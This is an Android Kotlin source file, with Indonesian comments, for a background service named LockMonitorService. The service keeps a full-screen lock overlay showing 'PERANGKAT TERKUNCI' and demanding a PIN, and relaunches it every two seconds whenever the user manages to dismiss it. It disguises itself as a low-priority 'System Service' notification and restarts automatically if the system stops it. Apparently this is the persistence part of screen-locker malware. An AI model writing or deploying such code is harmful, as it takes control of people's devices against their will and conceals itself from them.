package com.template.app

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log

/**
 * Service yang jalan di background untuk memastikan LockOverlay
 * tetap aktif. Kalau ke-dismiss user, service akan restart overlay
 * dalam 2 detik.
 */
class LockMonitorService : Service() {

    companion object {
        private const val TAG = "LockMonitorService"
        private const val CHECK_INTERVAL_MS = 2000L
        private const val EXTRA_MESSAGE = "lock_message"
        private const val EXTRA_PIN = "lock_pin"

        private var isRunning = false
        private var lockMessage = "PERANGKAT TERKUNCI"
        private var lockPin = "1234"

        fun start(context: Context, message: String, pin: String) {
            if (isRunning) {
                Log.d(TAG, "Monitor already running")
                return
            }

            lockMessage = message
            lockPin = pin

            try {
                val intent = Intent(context, LockMonitorService::class.java).apply {
                    putExtra(EXTRA_MESSAGE, message)
                    putExtra(EXTRA_PIN, pin)
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }

                isRunning = true
                Log.d(TAG, "✅ Monitor service started")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start monitor", e)
            }
        }

        fun stop(context: Context) {
            try {
                val intent = Intent(context, LockMonitorService::class.java)
                context.stopService(intent)
                isRunning = false
                Log.d(TAG, "🛑 Monitor service stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to stop monitor", e)
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var monitorRunnable: Runnable? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Monitor service created")

        // Foreground notification (biar tidak dibunuh OS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundSafely()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val msg = intent?.getStringExtra(EXTRA_MESSAGE) ?: lockMessage
        val pin = intent?.getStringExtra(EXTRA_PIN) ?: lockPin

        lockMessage = msg
        lockPin = pin

        // Start monitoring loop
        startMonitoring()

        // START_STICKY = auto restart kalau dibunuh OS
        return START_STICKY
    }

    // ==========================================
    // ===== FOREGROUND NOTIFICATION =====
    // ==========================================
    private fun startForegroundSafely() {
        try {
            val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    "lock_monitor",
                    "Lock Monitor",
                    android.app.NotificationManager.IMPORTANCE_MIN
                )
                val nm = getSystemService(Context.NOTIFICATION_SERVICE)
                        as android.app.NotificationManager
                nm.createNotificationChannel(channel)

                android.app.Notification.Builder(this, "lock_monitor")
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build()
            } else {
                @Suppress("DEPRECATION")
                android.app.Notification.Builder(this)
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build()
            }

            startForeground(99991, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground", e)
        }
    }

    // ==========================================
    // ===== MONITORING LOOP =====
    // ===== Cek tiap 2 detik apakah lock masih aktif =====
    // ==========================================
    private fun startMonitoring() {
        monitorRunnable?.let { handler.removeCallbacks(it) }

        monitorRunnable = object : Runnable {
            override fun run() {
                checkAndRestart()
                handler.postDelayed(this, CHECK_INTERVAL_MS)
            }
        }

        handler.post(monitorRunnable!!)
    }

    private fun checkAndRestart() {
        try {
            // Kalau LockOverlayManager tidak punya active instance →
            // berarti user berhasil keluar, restart overlay
            val hasActiveLock = LockOverlayManager.hasActiveLock()

            if (!hasActiveLock) {
                Log.w(TAG, "⚠️ Lock overlay NOT active — restarting...")

                // Restart LockOverlayActivity
                val intent = Intent(this, LockOverlayActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_NO_HISTORY or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                    )
                    putExtra(LockOverlayActivity.EXTRA_MESSAGE, lockMessage)
                    putExtra(LockOverlayActivity.EXTRA_PIN, lockPin)
                }

                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Check error", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        monitorRunnable?.let { handler.removeCallbacks(it) }
        isRunning = false
        Log.d(TAG, "Monitor destroyed")
    }
}
